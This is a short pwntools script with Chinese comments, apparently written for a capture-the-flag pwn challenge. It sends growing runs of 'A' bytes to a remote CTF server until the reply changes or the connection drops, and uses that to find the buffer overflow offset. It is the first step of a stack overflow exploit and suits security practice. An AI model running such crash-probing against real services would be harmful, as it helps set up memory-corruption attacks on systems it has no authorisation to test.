from pwn import *

# 禁用 pwntools 的烦人日志，只看我们要的输出
context.log_level = 'error' 

def get_offset():
    for i in range(1, 200):
        print(f"[>] Testing length: {i}", end='\r') # 实时显示进度
        try:
            p = remote('pwn.challenge.ctf.show', 28196, timeout=5)
            p.recvuntil(b'daniu?\n')
            p.send(b'A' * i)
            
            # 关键：我们看程序是否返回了正常的退出语
            response = p.recvall(timeout=1)
            
            if b"See you" not in response:
                print(f"\n[!] 发现异常！长度为 {i} 时程序反馈不正常。")
                # 这里的 i-1 很可能就是 offset
                return i - 1
            p.close()
        except (EOFError, Exception) as e:
            print(f"\n[*] 程序在长度 {i} 时崩溃/连接断开。")
            return i - 1

offset = get_offset()
print(f"\n[+] 最终确定的 Offset 是: {offset}")